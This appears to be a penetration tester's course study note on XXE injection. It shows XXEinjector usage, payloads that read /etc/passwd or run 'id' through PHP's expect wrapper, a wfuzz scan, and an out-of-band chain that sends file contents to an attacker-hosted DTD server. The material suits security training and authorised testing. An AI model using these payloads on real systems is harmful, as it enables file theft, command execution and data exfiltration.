
>[!info]
>This note is still in development.

### Overview
---
An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.

**Reference(s):**
- https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/
- https://portal.offsec.com/courses/web-200/books-and-videos/modal/modules/xml-external-entities/xml-external-entities

### Tools
---
- [XXEinjector](https://github.com/enjoiz/XXEinjector)
```shell
# Installation
git clone https://github.com/enjoiz/XXEinjector
cd XXEinjector

# Usage
ruby xxeinjector.rb --host <url> --file <xxe_payload>
```

### Payloads
---
- LFI
```php
<?xml version="1.0" encoding="ISO-8859-1"?>  
<!DOCTYPE foo [ <!ELEMENT foo ANY >  
<!ENTITY **xxe** SYSTEM **"file:///etc/passwd"** >]>  
<creds>  
    <user>**&xxe;**</user>  
    <pass>mypass</pass>  
</creds>
```

- RCE using PHP "expect" module to return current user
```php

<?xml version="1.0" encoding="ISO-8859-1"?>  
<!DOCTYPE foo [ <!ELEMENT foo ANY >  
<!ENTITY **xxe** SYSTEM **"expect://id"** >]>  
<creds>  
    <user>**&xxe;**</user>  
    <pass>mypass</pass>  
</creds>
```

### Scanning
---
```
wfuzz -c -z file,/usr/share/SecLists/Fuzzing/XXE-Fuzzing.txt --hc 404,301 "<URL>/index.php?parameter=FUZZ"

# -c   = output in color
# -z   = type of payload (e.g, file,<filepath>)
# --hc = hide responses containing specified statuses
```

Exploitation:
1. Create "external.dtd"
```
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://[kali-ip]/out?%content;'>" >
```
2. Host with a simple HTTP server
3. Insert file in payload
```
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://<attacker_ip>/external.dtd"> 
%base;
%external;
%exfil;
]>
```

### Discovery
---
![[Pasted image 20231015202411.png]]
- If the above syntax replaces the "lastname" value with "Replace", the site is vulnerable to XXE.

### Exploitation
---
Retrieving files (LFI)
![[Pasted image 20231015202421.png]]

```xml
<!ENTITY <variable_name> SYSTEM "file:///<file>/<path>">
```
